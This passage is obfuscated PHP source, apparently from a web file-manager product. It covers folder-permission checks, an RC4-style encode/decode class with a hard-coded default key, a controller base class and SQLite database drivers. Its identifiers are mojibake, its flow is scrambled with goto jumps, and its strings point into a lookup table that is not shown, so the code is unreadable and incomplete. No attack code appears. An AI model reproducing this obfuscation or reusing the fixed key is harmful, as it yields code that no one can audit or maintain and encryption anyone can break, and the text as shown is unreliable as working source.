FœÌ°ÄÒ; C—áÓÍ˜ÛÙ: $DÎ÷ó›Ğ² =& $_SERVER[ÍÓÖ€°å]; $c¶ï¤“òİ´ = Session::get($DÎ÷ó›Ğ²[1636]); $CòãÒ©Š¹Å = Model($DÎ÷ó›Ğ²[827])->parentLevelArray($a’İğÒĞ›ã[$DÎ÷ó›Ğ²[364]]); goto AÄîî†«Å¥; AÄîî†«Å¥: $CòãÒ©Š¹Å = array_merge(array($a’İğÒĞ›ã[$DÎ÷ó›Ğ²[365]]), array_reverse($CòãÒ©Š¹Å)); $F®Äáó‚ = !1; foreach ($CòãÒ©Š¹Å as $A‡Ïå‰àİÜ) { if (!isset($F¨Ü™‘•õ®[$A‡Ïå‰àİÜ])) { continue; } $dï¡“ˆÙöå = $this->authMake($F¨Ü™‘•õ®[$A‡Ïå‰àİÜ]); if ($dï¡“ˆÙöå[$DÎ÷ó›Ğ²[1663]]) { $F®Äáó‚ = $dï¡“ˆÙöå; break; } } goto dÊšá‰Æ™¹; FœÌ°ÄÒ: } public function authOwnerApply($D«ÙšĞ£») { goto b‚ƒ²¨—À; b‚ƒ²¨—À: $aªù«‚À„Ÿ =& $_SERVER[ÍÓÖ€°å]; if (!$D«ÙšĞ£»[$aªù«‚À„Ÿ[540]] || $D«ÙšĞ£»[$aªù«‚À„Ÿ[1672]]) { return $D«ÙšĞ£»; } if (AuthModel::authCheckRoot($D«ÙšĞ£»[$aªù«‚À„Ÿ[540]][$aªù«‚À„Ÿ[1662]])) { return $D«ÙšĞ£»; } goto c„‡ˆêŠ¥Ì; E·Š¼÷Õ¹³: $D«ÙšĞ£»[$aªù«‚À„Ÿ[540]][$aªù«‚À„Ÿ[1674]] = Model($aªù«‚À„Ÿ[1675])->userListInfo($c“ÌÆ…); return $D«ÙšĞ£»; goto Aõ„«»ÁŸ›; FáŠñÅ»”¶: if (count($c“ÌÆ…) == 0) { $c“ÌÆ… = $this->authFolderOwnerGroup($D«ÙšĞ£»[$aªù«‚À„Ÿ[386]]); } $c“ÌÆ… = array_unique($c“ÌÆ…); if (AuthModel::authCheckRoot($D«ÙšĞ£»[$aªù«‚À„Ÿ[540]][$aªù«‚À„Ÿ[1662]])) { $c“ÌÆ…[] = USER_ID; } goto E·Š¼÷Õ¹³; eÙøòä¢œö: $C¯Øòäó¸˜ = array($aªù«‚À„Ÿ[406] => array($aªù«‚À„Ÿ[946], $CóšùÊˆë²)); $dùÕ«ºˆê¯ = $this->field($CÓ„ôÚÊ¹Û)->where($C¯Øòäó¸˜)->select(); $dùÕ«ºˆê¯ = array_to_keyvalue_group($dùÕ«ºˆê¯, $aªù«‚À„Ÿ[365]); goto c„´®Ü¦á˜; c„‡ˆêŠ¥Ì: $CóšùÊˆë² = Model($aªù«‚À„Ÿ[827])->parentLevelArray($D«ÙšĞ£»[$aªù«‚À„Ÿ[364]]); $CóšùÊˆë² = array_merge(array($D«ÙšĞ£»[$aªù«‚À„Ÿ[365]]), array_reverse($CóšùÊˆë²)); $CÓ„ôÚÊ¹Û = $aªù«‚À„Ÿ[1661]; goto eÙøòä¢œö; c„´®Ü¦á˜: $a× •öÁ = array(); $c“ÌÆ… = array(); foreach ($dùÕ«ºˆê¯ as $BÌŒÀØØœ => $fÈ»ÆÇÑÓÖ) { $DË¶‹›Äš = $this->authFolderOwnerUser($fÈ»ÆÇÑÓÖ); $a× •öÁ[$BÌŒÀØØœ] = $DË¶‹›Äš; $c“ÌÆ… = array_merge($c“ÌÆ…, $DË¶‹›Äš[$aªù«‚À„Ÿ[407]]); if ($DË¶‹›Äš[$aªù«‚À„Ÿ[1673]]) { break; } } goto FáŠñÅ»”¶; Aõ„«»ÁŸ›: } private function authFolderOwnerGroup($DØÒŠÒ“ù) { $C Ö§÷â•ä =& $_SERVER[ÍÓÖ€°å]; $D†â¶ƒÃÏÅ = Model($C Ö§÷â•ä[1600])->where(array($C Ö§÷â•ä[1516] => $DØÒŠÒ“ù))->select(); $eéùÈ•î†Ú = array(); if (!$D†â¶ƒÃÏÅ) { return $eéùÈ•î†Ú; } foreach ($D†â¶ƒÃÏÅ as $E¡å®†çè”) { $bº½¯šËÒ¢ = $this->authInfo($E¡å®†çè”); if (AuthModel::authCheckRoot($bº½¯šËÒ¢[$C Ö§÷â•ä[540]])) { $eéùÈ•î†Ú[] = $E¡å®†çè”[$C Ö§÷â•ä[1062]]; } } return $eéùÈ•î†Ú; } private function authFolderOwnerUser($bÃ‡Ç©Ë‡) { $d‹‘µëÕ»Ş =& $_SERVER[ÍÓÖ€°å]; $CÌãõÃŞ¨– = array(); $B—°›‰ìï« = !1; foreach ($bÃ‡Ç©Ë‡ as $e²—¯ÉŠôå) { $FÜö¢Ò÷éó = $this->authInfo($e²—¯ÉŠôå); if ($e²—¯ÉŠôå[$d‹‘µëÕ»Ş[386]] == $d‹‘µëÕ»Ş[393]) { $B—°›‰ìï« = !0; } if ($e²—¯ÉŠôå[$d‹‘µëÕ»Ş[384]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($FÜö¢Ò÷éó[$d‹‘µëÕ»Ş[540]])) { $CÌãõÃŞ¨–[] = $e²—¯ÉŠôå[$d‹‘µëÕ»Ş[386]]; } } } return array($d‹‘µëÕ»Ş[407] => $CÌãõÃŞ¨–, $d‹‘µëÕ»Ş[1673] => $B—°›‰ìï«); } public function authMake($f¸‹±Òğ¯) { goto E©ÒÊÈŸ××; DôòÛ˜ÎÕ‡: $b©¨ŒÅÔ´ç = 0; $cëäÖ¸‹ƒ = 0; $a„–İÁ”ç = 0; goto c¤‰³Éîë™; E©ÒÊÈŸ××: $e×İ‘Ú˜Ãß =& $_SERVER[ÍÓÖ€°å]; if (!$f¸‹±Òğ¯) { return array($e×İ‘Ú˜Ãß[1662] => 0, $e×İ‘Ú˜Ãß[1663] => !1); } $fß¤Á‡ŞÓ® = Session::get($e×İ‘Ú˜Ãß[1636]); goto B¸àøÕšÄƒ; B¸àøÕšÄƒ: $Dñ³½Ì„œö = array_to_keyvalue($fß¤Á‡ŞÓ®, $e×İ‘Ú˜Ãß[33], $e×İ‘Ú˜Ãß[1516]); $C²É³ãÈí› = 0; $dß„Ç‰†ñˆ = 0; goto DñÄ¸õƒ¤Ì; c¤‰³Éîë™: $Aïñç—èòÔ = 0; foreach ($f¸‹±Òğ¯ as $BÈ®ïØªÃ) { $d÷Â‚Üãà = $this->authInfo($BÈ®ïØªÃ); $EÁ¾¢ˆŸÄØ = $BÈ®ïØªÃ[$e×İ‘Ú˜Ãß[386]]; $C¾¸Şö¯ß‚ = intval($d÷Â‚Üãà[$e×İ‘Ú˜Ãß[540]]); if ($BÈ®ïØªÃ[$e×İ‘Ú˜Ãß[384]] == SourceModel::TYPE_USER && $EÁ¾¢ˆŸÄØ == USER_ID) { $cëäÖ¸‹ƒ = !0; $B‡Æ¢äª«† = $d÷Â‚Üãà; $C²É³ãÈí› = $C¾¸Şö¯ß‚; } else { if ($BÈ®ïØªÃ[$e×İ‘Ú˜Ãß[384]] == SourceModel::TYPE_GROUP && in_array($EÁ¾¢ˆŸÄØ, $Dñ³½Ì„œö)) { $a„–İÁ”ç = !0; if ($C¾¸Şö¯ß‚ >= $dß„Ç‰†ñˆ) { $dß„Ç‰†ñˆ = $C¾¸Şö¯ß‚; $AÉîºø°ÄÇ = $d÷Â‚Üãà; } } else { if ($EÁ¾¢ˆŸÄØ == 0) { $Aïñç—èòÔ = !0; $b©¨ŒÅÔ´ç = $d÷Â‚Üãà; $Eæ™Ìà°‚à = $C¾¸Şö¯ß‚; } } } } $F‹éµìŸ‡ = $cëäÖ¸‹ƒ ? $C²É³ãÈí› : ($a„–İÁ”ç ? $dß„Ç‰†ñˆ : $Eæ™Ìà°‚à); goto dŸÑ«¬­; DñÄ¸õƒ¤Ì: $Eæ™Ìà°‚à = 0; $B‡Æ¢äª«† = 0; $AÉîºø°ÄÇ = 0; goto DôòÛ˜ÎÕ‡; dŸÑ«¬­: $d÷Â‚Üãà = $cëäÖ¸‹ƒ ? $B‡Æ¢äª«† : ($a„–İÁ”ç ? $AÉîºø°ÄÇ : $b©¨ŒÅÔ´ç); $Dº‰Ò–õ‚â = array($e×İ‘Ú˜Ãß[1670] => intval($F‹éµìŸ‡), $e×İ‘Ú˜Ãß[1671] => $d÷Â‚Üãà); return $Dº‰Ò–õ‚â; goto eÉ÷ÎÕ—ëÆ; eÉ÷ÎÕ—ëÆ: } public function authTargetInfoMake($CÙ¯˜±ëøò) { goto eª÷°Ï›Ö; aç–¤ä¯ÛÅ: return array($cÉÓò¥µç[1676] => $b¸´Ğí£‘ß, $cÉÓò¥µç[1677] => $d™ˆÑ±®¢‘); goto A°´¶ô; CÔ´¿Ş¢æ„: foreach ($CÙ¯˜±ëøò as $eÅó‹­Œô) { if ($eÅó‹­Œô[$cÉÓò¥µç[384]] == SourceModel::TYPE_USER) { $b¸´Ğí£‘ß[] = intval($eÅó‹­Œô[$cÉÓò¥µç[386]]); } else { if ($eÅó‹­Œô[$cÉÓò¥µç[384]] == SourceModel::TYPE_GROUP) { $d™ˆÑ±®¢‘[] = intval($eÅó‹­Œô[$cÉÓò¥µç[386]]); } } } if ($b¸´Ğí£‘ß) { $b¸´Ğí£‘ß = Model($cÉÓò¥µç[1675])->userListInfo($b¸´Ğí£‘ß); } if ($d™ˆÑ±®¢‘) { $D¶ÈŞ¢İÑ = array($cÉÓò¥µç[1598] => array($cÉÓò¥µç[946], $d™ˆÑ±®¢‘)); $d™ˆÑ±®¢‘ = Model($cÉÓò¥µç[1669])->field($cÉÓò¥µç[1615])->where($D¶ÈŞ¢İÑ)->select(); $d™ˆÑ±®¢‘ = array_to_keyvalue($d™ˆÑ±®¢‘, $cÉÓò¥µç[1516]); } goto aç–¤ä¯ÛÅ; eª÷°Ï›Ö: $cÉÓò¥µç =& $_SERVER[ÍÓÖ€°å]; $b¸´Ğí£‘ß = array(); $d™ˆÑ±®¢‘ = array(); goto CÔ´¿Ş¢æ„; A°´¶ô: } private function authInfo($f‰°â—È) { $dÎˆñàÍ· =& $_SERVER[ÍÓÖ€°å]; if ($f‰°â—È[$dÎˆñàÍ·[1652]]) { $eÅ¬Í–‰¶ó = Model($dÎˆñàÍ·[1658])->listData($f‰°â—È[$dÎˆñàÍ·[1652]]); if (!$eÅ¬Í–‰¶ó) { return !1; $FØ¤Ö„®ùº = Model($dÎˆñàÍ·[1658])->listData(); $dŠŠâï„ù˜ = array_filter_by_field($FØ¤Ö„®ùº, $dÎˆñàÍ·[540], $dÎˆñàÍ·[393]); return $dŠŠâï„ù˜; } $a„ ñæÖÊ = array_field_key($eÅ¬Í–‰¶ó, array($dÎˆñàÍ·[357], $dÎˆñàÍ·[28], $dÎˆñàÍ·[540], $dÎˆñàÍ·[1534], $dÎˆñàÍ·[1537])); $a„ ñæÖÊ[$dÎˆñàÍ·[1678]] = $f‰°â—È; return $a„ ñæÖÊ; } else { return array($dÎˆñàÍ·[789] => 0, $dÎˆñàÍ·[1522] => $f‰°â—È[$dÎˆñàÍ·[1653]], $dÎˆñàÍ·[378] => $dÎˆñàÍ·[33], $dÎˆñàÍ·[1534] => $dÎˆñàÍ·[1679]); } } } goto EêâÉ±·¥¥; CËÖó´¼†: class Mcrypt { public static $default_key = "\x61\x21\x74\141\x6b\101\72\x64\x6c\155\x63\154\x64\x45\166\54\145"; public static function encode($F“£Ö°Ï‡¦, $eßŠÉºÆÛğ = '', $CÍÂíí›¥â = 0) { goto C±¯ „”; e×Åš»©®”: $E©ÛÎ™¼×Î = range(0, 255); for ($cíŒó„†Í = $D¢ÔÓâØ¡ = 0; $D¢ÔÓâØ¡ < 256; $D¢ÔÓâØ¡++) { $cíŒó„†Í = ($cíŒó„†Í + $E©ÛÎ™¼×Î[$D¢ÔÓâØ¡] + $f´“æø©©[$D¢ÔÓâØ¡]) % 256; $d…ˆÂß™ÚÜ = $E©ÛÎ™¼×Î[$D¢ÔÓâØ¡]; $E©ÛÎ™¼×Î[$D¢ÔÓâØ¡] = $E©ÛÎ™¼×Î[$cíŒó„†Í]; $E©ÛÎ™¼×Î[$cíŒó„†Í] = $d…ˆÂß™ÚÜ; } $Fè½ŸÎ¦„Ï = $a„´ãÈ„º²[33]; goto Eƒë…Éˆ„; d¹îñÃÆ•¶: $D¡››·÷› = $Fˆø˜”¯™ . md5($Fˆø˜”¯™ . $EÛÈêÅ°…); $BÚë·÷ó = strlen($D¡››·÷›); $F“£Ö°Ï‡¦ = sprintf($a„´ãÈ„º²[1298], $CÍÂíí›¥â ? $CÍÂíí›¥â + time() : 0) . substr(md5($F“£Ö°Ï‡¦ . $eÑ»›ì†Ã), 0, 16) . $F“£Ö°Ï‡¦; goto fìî­›¾æ; C±¯ „”: $a„´ãÈ„º² =& $_SERVER[ÍÓÖ€°å]; $e„Ó¦”š¯ = 4; $eßŠÉºÆÛğ = md5($eßŠÉºÆÛğ ? $eßŠÉºÆÛğ : self::$default_key); goto Fç™äªÂ…; fìî­›¾æ: $b‡ö´›İ = strlen($F“£Ö°Ï‡¦); $f´“æø©© = array(); for ($D¢ÔÓâØ¡ = 0; $D¢ÔÓâØ¡ <= 255; $D¢ÔÓâØ¡++) { $f´“æø©©[$D¢ÔÓâØ¡] = ord($D¡››·÷›[$D¢ÔÓâØ¡ % $BÚë·÷ó]); } goto e×Åš»©®”; Fç™äªÂ…: $Fˆø˜”¯™ = md5(substr($eßŠÉºÆÛğ, 0, 16)); $eÑ»›ì†Ã = md5(substr($eßŠÉºÆÛğ, 16, 16)); $EÛÈêÅ°… = substr(md5(microtime()), -$e„Ó¦”š¯); goto d¹îñÃÆ•¶; Eƒë…Éˆ„: for ($dà™‰—ÏÉ = $cíŒó„†Í = $D¢ÔÓâØ¡ = 0; $D¢ÔÓâØ¡ < $b‡ö´›İ; $D¢ÔÓâØ¡++) { $dà™‰—ÏÉ = ($dà™‰—ÏÉ + 1) % 256; $cíŒó„†Í = ($cíŒó„†Í + $E©ÛÎ™¼×Î[$dà™‰—ÏÉ]) % 256; $d…ˆÂß™ÚÜ = $E©ÛÎ™¼×Î[$dà™‰—ÏÉ]; $E©ÛÎ™¼×Î[$dà™‰—ÏÉ] = $E©ÛÎ™¼×Î[$cíŒó„†Í]; $E©ÛÎ™¼×Î[$cíŒó„†Í] = $d…ˆÂß™ÚÜ; $Fè½ŸÎ¦„Ï .= chr(ord($F“£Ö°Ï‡¦[$D¢ÔÓâØ¡]) ^ $E©ÛÎ™¼×Î[($E©ÛÎ™¼×Î[$dà™‰—ÏÉ] + $E©ÛÎ™¼×Î[$cíŒó„†Í]) % 256]); } $Fè½ŸÎ¦„Ï = $EÛÈêÅ°… . str_replace($a„´ãÈ„º²[662], $a„´ãÈ„º²[33], base64_encode($Fè½ŸÎ¦„Ï)); $Fè½ŸÎ¦„Ï = str_replace(array($a„´ãÈ„º²[276], $a„´ãÈ„º²[8], $a„´ãÈ„º²[662]), array($a„´ãÈ„º²[489], $a„´ãÈ„º²[71], $a„´ãÈ„º²[90]), $Fè½ŸÎ¦„Ï); goto F’‹ËÏÓÚ; F’‹ËÏÓÚ: return $Fè½ŸÎ¦„Ï; goto aí®šÜÊŠ„; aí®šÜÊŠ„: } public static function decode($e¥ÈÜôòÆÒ, $c­ïªãŒ« = '') { goto dê°ŸèÉ°ò; eùÆø¬íã™: $e¥ÈÜôòÆÒ = base64_decode(substr($e¥ÈÜôòÆÒ, $DéØ¬½·Ç)); $f«¬™å‹å¶ = strlen($e¥ÈÜôòÆÒ); $AïÆíöÂƒ = array(); goto b¯’Š›‰Üå; F¼«¨¯ôİ¶: $E‹éî‹ÉÁÖ = $AèíŞ‰ÎÜÜ[33]; for ($eëÂØÀíëÇ = $Ağà§ÉÀ = $dõ®Øî×Òñ = 0; $dõ®Øî×Òñ < $f«¬™å‹å¶; $dõ®Øî×Òñ++) { $eëÂØÀíëÇ = ($eëÂØÀíëÇ + 1) % 256; $Ağà§ÉÀ = ($Ağà§ÉÀ + $cîˆø‚Ìî[$eëÂØÀíëÇ]) % 256; $D¯çØíñ®î = $cîˆø‚Ìî[$eëÂØÀíëÇ]; $cîˆø‚Ìî[$eëÂØÀíëÇ] = $cîˆø‚Ìî[$Ağà§ÉÀ]; $cîˆø‚Ìî[$Ağà§ÉÀ] = $D¯çØíñ®î; $E‹éî‹ÉÁÖ .= chr(ord($e¥ÈÜôòÆÒ[$dõ®Øî×Òñ]) ^ $cîˆø‚Ìî[($cîˆø‚Ìî[$eëÂØÀíëÇ] + $cîˆø‚Ìî[$Ağà§ÉÀ]) % 256]); } if ((substr($E‹éî‹ÉÁÖ, 0, 10) == 0 || substr($E‹éî‹ÉÁÖ, 0, 10) - time() > 0) && substr($E‹éî‹ÉÁÖ, 10, 16) == substr(md5(substr($E‹éî‹ÉÁÖ, 26) . $D»™‡Î”), 0, 16)) { return substr($E‹éî‹ÉÁÖ, 26); } else { return $AèíŞ‰ÎÜÜ[33]; } goto dØŒ³µà…Ğ; EÈ¿¦»º“Ï: $c­ïªãŒ« = md5($c­ïªãŒ« ? $c­ïªãŒ« : self::$default_key); $b‰ÖÔï‘¨ = md5(substr($c­ïªãŒ«, 0, 16)); $D»™‡Î” = md5(substr($c­ïªãŒ«, 16, 16)); goto c×¼Œ¯ã©Ø; c×¼Œ¯ã©Ø: $d¶•ÈëÚöˆ = substr($e¥ÈÜôòÆÒ, 0, $DéØ¬½·Ç); $CŠÌ–óœ  = $b‰ÖÔï‘¨ . md5($b‰ÖÔï‘¨ . $d¶•ÈëÚöˆ); $Eµ¥Æ…ïˆâ = strlen($CŠÌ–óœ ); goto eùÆø¬íã™; b¯’Š›‰Üå: for ($dõ®Øî×Òñ = 0; $dõ®Øî×Òñ <= 255; $dõ®Øî×Òñ++) { $AïÆíöÂƒ[$dõ®Øî×Òñ] = ord($CŠÌ–óœ [$dõ®Øî×Òñ % $Eµ¥Æ…ïˆâ]); } $cîˆø‚Ìî = range(0, 255); for ($Ağà§ÉÀ = $dõ®Øî×Òñ = 0; $dõ®Øî×Òñ < 256; $dõ®Øî×Òñ++) { $Ağà§ÉÀ = ($Ağà§ÉÀ + $cîˆø‚Ìî[$dõ®Øî×Òñ] + $AïÆíöÂƒ[$dõ®Øî×Òñ]) % 256; $D¯çØíñ®î = $cîˆø‚Ìî[$dõ®Øî×Òñ]; $cîˆø‚Ìî[$dõ®Øî×Òñ] = $cîˆø‚Ìî[$Ağà§ÉÀ]; $cîˆø‚Ìî[$Ağà§ÉÀ] = $D¯çØíñ®î; } goto F¼«¨¯ôİ¶; dê°ŸèÉ°ò: $AèíŞ‰ÎÜÜ =& $_SERVER[ÍÓÖ€°å]; $e¥ÈÜôòÆÒ = str_replace(array($AèíŞ‰ÎÜÜ[489], $AèíŞ‰ÎÜÜ[71], $AèíŞ‰ÎÜÜ[90]), array($AèíŞ‰ÎÜÜ[276], $AèíŞ‰ÎÜÜ[8], $AèíŞ‰ÎÜÜ[662]), $e¥ÈÜôòÆÒ); $DéØ¬½·Ç = 4; goto EÈ¿¦»º“Ï; dØŒ³µà…Ğ: } } define($_SERVER[ÍÓÖ€°å][1299], 1); define($_SERVER[ÍÓÖ€°å][1300], 2); goto c››ØøÚ÷; aÌ“¼­í: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto AÓ™çğ½× ; E¥§«ä•µœ: $this->tpl = TEMPLATE . MOD . $D×†—‰Î©Ÿ[8]; $this->_classObjectID = mt_rand(0, 10000); goto b•î­²§Ø×; fÚÓÔ³ÔÀÜ: $this->in =& $in; $this->values[$D×†—‰Î©Ÿ[6]] =& $config; $this->values[$D×†—‰Î©Ÿ[7]] =& $in; goto E¥§«ä•µœ; AÓ™çğ½× : $D×†—‰Î©Ÿ =& $_SERVER[ÍÓÖ€°å]; global $in, $config; $this->config =& $config; goto fÚÓÔ³ÔÀÜ; b•î­²§Ø×: } public function loadClass($e½´´¿„­à) { if (1 === func_num_args()) { $this->{$e½´´¿„­à} = new $e½´´¿„­à(); } else { $FÔÔ©†ƒŠí = new ReflectionClass($e½´´¿„­à); $DÏŸ ÆŠŠ¤ = func_get_args(); array_shift($DÏŸ ÆŠŠ¤); $this->{$e½´´¿„­à} = $FÔÔ©†ƒŠí->newInstanceArgs($DÏŸ ÆŠŠ¤); } return $this->{$e½´´¿„­à}; } protected function assign($C¤ºˆäöê, $b’­÷—¯‡) { $this->values[$C¤ºˆäöê] = $b’­÷—¯‡; } protected function display($f”íë‘¡†) { ob_end_clean(); extract($this->values); require $this->tpl . $f”íë‘¡†; } } class DbSqliteBase extends Db { public function __construct($Fç»Ñ°²Ìá = '') { $EéÜÇ® ™Ë =& $_SERVER[ÍÓÖ€°å]; if (!extension_loaded($EéÜÇ® ™Ë[9])) { think_exception(think_lang($EéÜÇ® ™Ë[10]) . $EéÜÇ® ™Ë[11]); } if (!empty($Fç»Ñ°²Ìá)) { if (!isset($Fç»Ñ°²Ìá[$EéÜÇ® ™Ë[12]])) { $Fç»Ñ°²Ìá[$EéÜÇ® ™Ë[12]] = 438; } $this->config = $Fç»Ñ°²Ìá; if (empty($this->config[$EéÜÇ® ™Ë[13]])) { $this->config[$EéÜÇ® ™Ë[13]] = array(); } } } public function connect($DöîÛËÎÌì = '', $c†Ò«öê = 0) { $dØø¹Œ¸ªó =& $_SERVER[ÍÓÖ€°å]; if (!isset($this->linkID[$c†Ò«öê])) { goto F—¤‡‡­öˆ; F—¤‡‡­öˆ: if (empty($DöîÛËÎÌì)) { $DöîÛËÎÌì = $this->config; } $CŠé¢„š¬¯ = !empty($DöîÛËÎÌì[$dØø¹Œ¸ªó[13]][$dØø¹Œ¸ªó[14]]) ? $DöîÛËÎÌì[$dØø¹Œ¸ªó[13]][$dØø¹Œ¸ªó[14]] : $this->pconnect; $B„Ûñç¼‹‚ = $CŠé¢„š¬¯ ? $dØø¹Œ¸ªó[15] : $dØø¹Œ¸ªó[16]; goto cÈ¥ŠÛ–ù; cÈ¥ŠÛ–ù: $this->linkID[$c†Ò«öê] = $B„Ûñç¼‹‚($DöîÛËÎÌì[$dØø¹Œ¸ªó[17]], $DöîÛËÎÌì[$dØø¹Œ¸ªó[12]]); if (!$this->linkID[$c†Ò«öê]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto f¯ÊÔ½Ëß÷; f¯ÊÔ½Ëß÷: @sqlite_busy_timeout($this->linkID[$c†Ò«öê], 30000); if (1 != think_config($dØø¹Œ¸ªó[18])) { unset($this->config); } goto a‰¤¬µœƒĞ; a‰¤¬µœƒĞ: } return $this->linkID[$c†Ò«öê]; } public function free() { $this->queryID = null; } public function query($E²Ï™ªåÁö) { goto fÆÃ¼¯ÍÔ£; d¿‚ñ»Ÿ£Í: $this->queryStr = $E²Ï™ªåÁö; if ($this->queryID) { $this->free(); } think_action_status($CğÀÄ„Â´İ[19], 1); goto a«‰®¸½Û ; fÆÃ¼¯ÍÔ£: $CğÀÄ„Â´İ =& $_SERVER[ÍÓÖ€°å]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d¿‚ñ»Ÿ£Í; aŞ»áˆ‚éÁ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $F—Œ‡Ì…¼ = $this->getAll(); return $F—Œ‡Ì…¼; } goto c—Ä‚½‡ƒ¿; a«‰®¸½Û : think_status($CğÀÄ„Â´İ[20]); $this->queryID = sqlite_query($this->_linkID, $E²Ï™ªåÁö); $this->debug(); goto aŞ»áˆ‚éÁ; c—Ä‚½‡ƒ¿: } public function execute($a¿à…ë ğ) { goto b¬â—¥„Ø¹; A—å¸µğˆ±: $this->queryStr = $a¿à…ë ğ; if ($this->queryID) { $this->free(); } think_action_status($f‰£‡ìíÄ[21], 1); goto B¥ Ô£‚ó™; b’°Îí†ƒÄ: if (!1 === $bƒ†ÂÀÇô¿) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto c·Ş²ïÜÚ¦; b¬â—¥„Ø¹: $f‰£‡ìíÄ =& $_SERVER[ÍÓÖ€°å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto A—å¸µğˆ±; B¥ Ô£‚ó™: think_status($f‰£‡ìíÄ[20]); $bƒ†ÂÀÇô¿ = sqlite_exec($this->_linkID, $a¿à…ë ğ); $this->debug(); goto b’°Îí†ƒÄ; c·Ş²ïÜÚ¦: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ÍÓÖ€°å][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $fòØ»ëçŞ = sqlite_query($this->_linkID, $_SERVER[ÍÓÖ€°å][23]); if (!$fòØ»ëçŞ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $DÛ¬¨†Ë»ì = sqlite_query($this->_linkID, $_SERVER[ÍÓÖ€°å][24]); if (!$DÛ¬¨†Ë»ì) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $fèÉÁ¾öÂ = array(); if ($this->numRows > 0) { for ($CŒğâ¿ŒÒà = 0; $CŒğâ¿ŒÒà < $this->numRows; $CŒğâ¿ŒÒà++) { $fèÉÁ¾öÂ[$CŒğâ¿ŒÒà] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $fèÉÁ¾öÂ; } public function getFields($eÎ‚¾ÆÖ‰) { $a‡¡°­À‘ =& $_SERVER[ÍÓÖ€°å]; $cÂ«ó‚²‹ô = $this->query($a‡¡°­À‘[25] . $eÎ‚¾ÆÖ‰ . $a‡¡°­À‘[26]); $aÈİœˆ‡È = array(); if ($cÂ«ó‚²‹ô) { foreach ($cÂ«ó‚²‹ô as $Bç¨’ÇõĞ => $aÇ×»Åä¥±) { $aÈİœˆ‡È[$aÇ×»Åä¥±[$a‡¡°­À‘[27]]] = array($a‡¡°­À‘[28] => $aÇ×»Åä¥±[$a‡¡°­À‘[27]], $a‡¡°­À‘[29] => $aÇ×»Åä¥±[$a‡¡°­À‘[30]], $a‡¡°­À‘[31] => (bool) ($aÇ×»Åä¥±[$a‡¡°­À‘[32]] === $a‡¡°­À‘[33]), $a‡¡°­À‘[34] => $aÇ×»Åä¥±[$a‡¡°­À‘[35]], $a‡¡°­À‘[36] => strtolower($aÇ×»Åä¥±[$a‡¡°­À‘[37]]) == $a‡¡°­À‘[38], $a‡¡°­À‘[39] => strtolower($aÇ×»Åä¥±[$a‡¡°­À‘[40]]) == $a‡¡°­À‘[41]); } } return $aÈİœˆ‡È; } public function getTables($b›šèŸÃ†® = '') { $b÷†¼¸‹ =& $_SERVER[ÍÓÖ€°å]; $fó¥ˆÇÔ = $this->query($b÷†¼¸‹[42] . $b÷†¼¸‹[43] . $b÷†¼¸‹[44]); $EÌØŞ—íÊÍ = array(); foreach ($fó¥ˆÇÔ as $C‰¨Ä»¯µî => $FŸƒ©Ñø»‡) { $EÌØŞ—íÊÍ[$C‰¨Ä»¯µî] = current($FŸƒ©Ñø»‡); } return $EÌØŞ—íÊÍ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Bá•™‚ÚŠÍ =& $_SERVER[ÍÓÖ€°å]; $E•¿©À©ß = sqlite_last_error($this->_linkID); $this->error = $E•¿©À©ß . $Bá•™‚ÚŠÍ[4] . sqlite_error_string($E•¿©À©ß); if ($Bá•™‚ÚŠÍ[33] != $this->queryStr) { $this->error .= LNG($Bá•™‚ÚŠÍ[45]) . $this->queryStr; } think_trace($this->error, $Bá•™‚ÚŠÍ[33], $Bá•™‚ÚŠÍ[46]); return $this->error; } public function escapeString($aàš˜Óë¨ô) { return sqlite_escape_string($aàš˜Óë¨ô); } public function parseLimit($c¦ƒéïá©ñ) { $aĞ–ÀìŞàğ =& $_SERVER[ÍÓÖ€°å]; $aè¤ñŒÍÒÈ = $aĞ–ÀìŞàğ[33]; if (!empty($c¦ƒéïá©ñ)) { $c¦ƒéïá©ñ = explode($aĞ–ÀìŞàğ[47], $c¦ƒéïá©ñ); if (count($c¦ƒéïá©ñ) > 1) { $aè¤ñŒÍÒÈ .= $aĞ–ÀìŞàğ[48] . $c¦ƒéïá©ñ[1] . $aĞ–ÀìŞàğ[49] . $c¦ƒéïá©ñ[0] . $aĞ–ÀìŞàğ[50]; } else { $aè¤ñŒÍÒÈ .= $aĞ–ÀìŞàğ[48] . $c¦ƒéïá©ñ[0] . $aĞ–ÀìŞàğ[50]; } } return $aè¤ñŒÍÒÈ; } } class DbSqlite3Base extends Db { public function __construct($bÌÕƒ“øæ» = '') { $A³ñğìèÕ =& $_SERVER[ÍÓÖ€°å]; if (!class_exists($A³ñğìèÕ[51])) { think_exception(think_lang($A³ñğìèÕ[10]) . $A³ñğìèÕ[52]); } if (!empty($bÌÕƒ“øæ»)) { if (!isset($bÌÕƒ“øæ»[$A³ñğìèÕ[12]])) { $bÌÕƒ“øæ»[$A³ñğìèÕ[12]] = 438; } $this->config = $bÌÕƒ“øæ»; if (empty($this->config[$A³ñğìèÕ[13]])) { $this->config[$A³ñğìèÕ[13]] = array(); } } } public function connect($A”¨øÉîÛÄ = '', $D†¶ÔµÉĞ = 0) { $e‘ï˜— ‘” =& $_SERVER[ÍÓÖ€°å]; if (!isset($this->linkID[$D†¶ÔµÉĞ])) { if (empty($A”¨øÉîÛÄ)) { $A”¨øÉîÛÄ = $this->config; } $this->linkID[$D†¶ÔµÉĞ] = new SQLite3($A”¨øÉîÛÄ[$e‘ï˜— ‘”[17]]); if 